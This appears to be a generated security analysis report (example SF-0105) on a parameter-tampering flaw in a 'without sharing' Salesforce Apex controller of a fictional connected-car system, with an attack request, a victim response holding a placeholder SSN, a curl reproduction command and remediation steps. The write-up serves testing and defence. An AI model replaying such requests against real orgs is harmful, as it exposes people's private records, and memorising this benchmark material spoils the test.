# Security Analysis Report
**System:** AetherDrive V2X Telematics (Salesforce-Integrated)
**Domain:** Automotive / Connected Car
**Example ID:** SF-0105
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Single-User — Pattern 10.2 | Parameter escalation on `LeadController.getLeadData` — attacker extends session scope to read any connected car Lead record |

---

## Finding 1 — Single-User: Parameter Escalation on Lead Object (Pattern 10.2)

### Summary
The Apex controller `LeadController` on AetherDrive V2X Telematics (`b175ac70.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Lead object. Per §5.0 Pattern 10.2, a valid session holder escalates their own session scope by substituting an arbitrary `leadId` to read victim connected car Lead records including SSN and confidential notes.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getLeadDetails(String leadId, ...)` but the Aura descriptor in §6.0 is `c.LeadController.getLeadData`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 10.2 — Parameter escalation (own session scope extension) (Single-User)
**Affected controller:** `c.LeadController.getLeadData`
**Affected endpoint:** `POST https://b175ac70.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://b175ac70.lightning.force.com/aura
Authorization: Bearer 00DB175AC70!ARb175ac70...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DB175AC70!ARb175ac70...

message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN",
"params":{"leadId":"001AC70","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Lead Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001AC70", "Name": "Victim Lead Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-54-3922"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DB175AC70!ARb175ac70..."
curl -s -X POST "https://b175ac70.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN","params":{"leadId":"001AC70","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-54-3922
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class LeadController { ... }`
2. `WHERE Id = :leadId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
